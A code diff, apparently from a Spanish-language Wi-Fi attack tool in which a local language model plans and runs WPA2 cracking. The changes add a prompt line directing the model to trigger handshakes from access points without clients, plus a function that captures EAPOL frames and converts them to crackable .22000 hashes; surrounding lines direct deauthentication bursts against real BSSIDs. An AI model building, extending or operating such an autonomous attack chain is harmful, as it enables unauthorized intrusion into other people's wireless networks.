@@ -1193,6 +1193,7 @@ window.iaAttack = async function () {
       'No uses deauth ni WPS: Npcap no puede inyectar en Windows. No repitas pasos. Si hay material .22000, ve directo a inspeccionar/crackear. Termina con restore_managed si activaste monitor.',
       'Para convert_pcap/inspect_hash/crack_hash puedes poner rutas de marcador de posición: el orquestador las sustituirá por los archivos reales generados en cada paso.',
       'Si el objetivo es WPA2-PSK sin PMKID y no hay MFPR, incluye deauth_burst (RT3070 WinUSB) con el BSSID y canal reales para forzar un handshake.',
+      'Si no hay clientes conectados al AP, usa trigger_handshake (auto-gatillo M1/M2 con la propia radio managed) con SSID/BSSID/canal para generar material crackeable.',
     ].join('\n') + (window.iaMemoryContext ? await window.iaMemoryContext() : '');
     const model = valOrEmpty($('ia-model')?.value) || null;
     let plan = await window.__invoke('ollama_tools', { prompt, model });
@@ -1261,7 +1262,9 @@ window.iaAttack = async function () {
       try {
         result = name === 'deauth_burst'
           ? await window.iaDeauthBurst(args)
-          : await window.iaExecuteTool(name, args);
+          : name === 'trigger_handshake'
+            ? await window.iaTriggerHandshake(args)
+            : await window.iaExecuteTool(name, args);
         if (name === 'crack_hash') {
           const done = await waitForAttack('crack_plan', 10 * 60 * 1000);
           result = { ...(result || {}), finished: done ? (done.p || {}) : { success: false } };
@@ -1378,6 +1381,31 @@ window.iaDeauthBurst = async function (args) {
     hashes: total,
     passes,
     message: ok ? '⚡ .22000 válido con ' + total + ' hash(es) + pcapng crudo guardado.' : 'EAPOL visto pero sin hash crackeable en la conversión (reintentar).',
+  };
+};
+
+// ── E0-24 fase C: auto-gatillo M1/M2 para APs sin clientes ──────────────────
+window.iaTriggerHandshake = async function (args) {
+  const bssid = String(args.bssid || '').toUpperCase();
+  const ssid = String(args.ssid || '').trim();
+  if (!bssid || !ssid) throw new Error('gatillo sin BSSID/SSID');
+  const probe = await window.__invoke('wifi_probe_trigger', {
+    ssid, bssid, channel: args.channel || null, duration_seconds: 15,
+  });
+  if (!(probe && probe.success && probe.output_file)) {
+    throw new Error((probe && probe.message) || 'auto-gatillo: sin captura EAPOL');
+  }
+  log('[gatillo] ' + probe.message, 'info');
+  const conv = await window.__invoke('convert_ethernet_eapol', {
+    pcapPath: probe.output_file, ssid, bssid,
+  });
+  if (!(conv && conv.success)) throw new Error((conv && conv.message) || 'conversión EAPOL falló');
+  return {
+    success: true,
+    output_file: conv.output_file,
+    pcapng: probe.output_file,
+    hashes: conv.hashes,
+    message: '⚡ .22000 válido con ' + conv.hashes + ' handshake(s): ' + conv.output_file,
   };
 };
 
